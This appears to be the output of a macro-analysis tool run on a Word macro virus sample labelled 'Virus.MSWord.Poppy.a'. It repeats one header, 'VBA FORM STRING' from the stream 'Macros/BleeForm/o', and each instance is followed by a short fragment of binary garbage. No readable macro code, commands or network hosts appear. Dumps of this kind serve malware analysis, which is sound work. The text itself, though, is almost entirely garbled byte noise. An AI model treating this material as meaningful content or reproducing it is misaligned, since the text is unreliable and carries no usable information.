VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ϸ�xV��k٪|é��%���Pz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/� _�d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r��t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�x�J�~s�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�%�Hf2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/I5�Y�gx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F�֩�U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4��[qU���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�1�&�zX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
aTHe>�����^��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V��J6@�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ws��zJb�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{��Pd��B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�d�����X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b���2m"H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0rA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s���<o��7��}E~�H�	i�a�\�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ŭ���AQq�iK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d z�nq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ӭ��M;�W�+����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�'>�Ѹ~7o��n�|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q��t�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
xV�S��M���--4��&��y��l�J����Q�fw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9s�G{�z�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
CJ�MQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C4��.���e9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I(~C�C@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7ot�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/%��U4T�E$�YB��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z3T\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Q��d���b��rS�Lr��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qֽ�Ϡ�6��ē~{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
踇S�Y�U�q^R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i--=��=�L����H���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g%�i[*ᨰ\.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�����	\~�$p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>~mǣ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��_��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�X< `~l�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|w�:g����9� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D<Ŷ���S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ς%YKe�\m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�K3@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�*`�M)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

IUo����z��)WQE;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q[=�Ю�АK퐨
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f�]�P��n I-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i秤
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
׼_�**'��̢R��E$F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�g���Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tn�_�I�`�*a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|r>PJ�	e�+ml �?�j���J�F�P��\4]L5�j�Fg��:���cM��#-�|�@	�#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u��4�
k�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F\ܮM>T�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
99轢�X[h��^�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j)ikǓU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]��a*�$0'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
627q�{�Yh�jz�}\ҫ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ι� d�N2}ziqn���z,�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�qn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B�Fv�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�4H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�|�@'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HݱNvȳ��g��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�FIl��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n�W�~���_Z���e�r���)� 0�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
΢'�%e��͓����A�'�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˨W1H�W
s��Pq���컊�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-mDT𣤐�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�
I,O��=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OP�u���3�H��'�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���d�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tZ3(F���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�S�O��@W]�ҺD�'��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��hݲ}A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��uO�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�]�v�����i�� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u4�i0r����*��08*I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
==���+�?�EO*�\2%UF�l`Cɸ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(�x>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�jt��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}������m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�	�ʐLe�1_}� �t���`Yi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Zx�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�����^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kr�����?�YI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9��<LA#��v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<��:ӏ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z򦺂�ҸJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��?N���N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�+d�Q
j�ڔ���"�M!z|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�w��$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D<4�f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�͹_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=`2�0e8|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�aLܼPG���Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��LrSE�;)v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=;#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2��F�3z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>��>���6��v���ޘ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=H�Z�9 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E9lpN�N=�=���J�`@A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
zv�F�P$�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z}��:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P�����`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�7�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�3H�n�E	�}p8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ӥ��T�p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<|���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IU�N0�.6��Џ�ж��h@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,�\�1�e�V����P��8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Hl{}�At��R��'=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�IL�H�T�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��uf���.O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=9oڶ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L��$
-------------------------------------------------------------------------------
